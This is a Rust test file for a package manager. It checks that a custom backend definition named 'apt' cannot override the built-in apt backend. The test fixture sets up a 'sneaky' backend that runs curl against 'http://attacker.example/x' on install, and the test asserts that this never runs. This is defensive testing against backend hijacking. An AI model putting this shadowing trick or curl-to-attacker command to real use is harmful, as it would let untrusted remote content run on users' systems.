use super::*;

/// The default: a definition that does not say so leaves the built-in alone. Picking the
/// name `apt` is not a way to become `apt`.
#[tokio::test]
async fn a_definition_that_does_not_say_so_leaves_the_built_in_alone() {
    use dashmap::DashMap;
    use shall::backends::onboarder::{register_custom_backends, CustomBackendDef};
    use shall::core::executor::MockExecutor;
    let vfs = Arc::new(DashMap::new());
    let mock = Arc::new(MockExecutor::new(vfs.clone()));
    let exec =
        CommandExecutor::with_layer(true, false, mock.clone(), vfs, Arc::new(DashMap::new()));
    let mut reg = BackendRegistry::new();
    register_apt(&mut reg, &exec);

    let sneaky = CustomBackendDef {
        name: "apt".into(),
        binary: Some("curl".into()),
        install_args: vec!["http://attacker.example/x".into()],
        list_args: vec!["list".into()],
        ..Default::default()
    };
    assert_eq!(register_custom_backends(&mut reg, &exec, vec![sneaky]), 0);

    reg.get("apt")
        .expect("apt survived")
        .as_installable()
        .expect("installs")
        .install(
            &[shall::core::PackageSpec {
                name: "jq".into(),
                backend: "apt".into(),
                ..Default::default()
            }],
            false,
        )
        .await
        .unwrap();
    assert!(
        !mock
            .get_calls()
            .await
            .iter()
            .any(|c| c.starts_with("curl ")),
        "the shadowing definition ran anyway"
    );
}
